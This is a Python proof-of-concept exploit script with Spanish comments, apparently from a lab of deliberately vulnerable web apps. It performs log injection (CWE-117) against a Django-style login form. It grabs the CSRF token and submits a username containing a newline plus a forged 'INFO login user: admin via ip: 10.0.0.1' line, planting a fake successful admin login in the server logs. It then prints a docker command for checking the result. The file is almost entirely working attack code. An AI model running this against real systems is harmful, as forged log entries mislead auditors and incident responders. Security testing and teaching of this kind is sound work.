"""
A09:2025 — Vuln 2: Log Injection (CWE-117)

El handler log_user_login en dojo/utils.py usa un f-string con el username
sin sanitizar saltos de línea. Un atacante puede inyectar líneas de log
falsas enviando un username que contenga caracteres de control (\\n, \\r).

Uso:
    python A09_V2.py --host http://<HOST>
    python A09_V2.py --host http://<HOST> --payload custom "admin\\nCRITICAL ..."
"""

import argparse
import re
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Helpers HTTP
# ---------------------------------------------------------------------------

def _login_attempt(host: str, username: str, password: str = "irrelevant") -> int:
    """
    Intenta autenticarse. Si el login tiene éxito, el username inyectado
    pasa por log_user_login (INFO). Si falla, pasa por log_user_login_failed
    (WARNING). Ambos son vulnerables a CWE-117.
    """
    login_url = f"{host.rstrip('/')}/login"
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    req = urllib.request.Request(login_url, method="GET")
    try:
        with opener.open(req) as r:
            html = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        html = e.read().decode(errors="replace")

    m = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', html)
    if not m:
        raise RuntimeError("No se encontró csrfmiddlewaretoken")

    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": m.group(1),
    }).encode()
    req = urllib.request.Request(
        login_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
        method="POST",
    )
    try:
        with opener.open(req) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


# ---------------------------------------------------------------------------
# Payloads predefinidos
# ---------------------------------------------------------------------------

def build_payload(fake_user: str = "admin", fake_ip: str = "10.0.0.1") -> str:
    """
    Construye un username que, al loguearse en el log con f-string, inyecta
    una línea de log falsa que simula un login exitoso del usuario `fake_user`.
    """
    injected_line = (
        f"INFO login user: {fake_user} via ip: {fake_ip}"
    )
    # El username real termina antes del \\n; lo que sigue es la línea inyectada
    return f"victim_user\n{injected_line}"


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(host: str, custom_payload: str | None = None) -> None:
    print("\n" + "=" * 60)
    print("VULN A09-2 — CWE-117: Log Injection")
    print("=" * 60)

    payload = custom_payload or build_payload(fake_user="admin", fake_ip="10.0.0.1")

    print(f"\n[*] Payload (username con inyección de salto de línea):")
    for i, line in enumerate(payload.split("\n")):
        print(f"    Línea {i}: {repr(line)}")

    print(f"\n[*] Enviando intento de login con username inyectado...")
    status = _login_attempt(host, payload)
    print(f"[+] HTTP {status} (el payload fue procesado por el logger)")

    print(f"\n[*] En los logs del contenedor se verá algo como:")
    print(f"    WARNING login failed for: victim_user")
    print(f"    INFO login user: admin via ip: 10.0.0.1   ← línea FALSA inyectada")
    print(f"\n    Para verificar:")
    print(f"    docker compose logs uwsgi 2>&1 | grep -A1 'victim_user'")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit A09 Vuln 2 — CWE-117: Log Injection"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--payload", metavar="USERNAME",
                        help="Payload personalizado (username con \\n incluido)")
    args = parser.parse_args()

    exploit(args.host, custom_payload=args.payload)
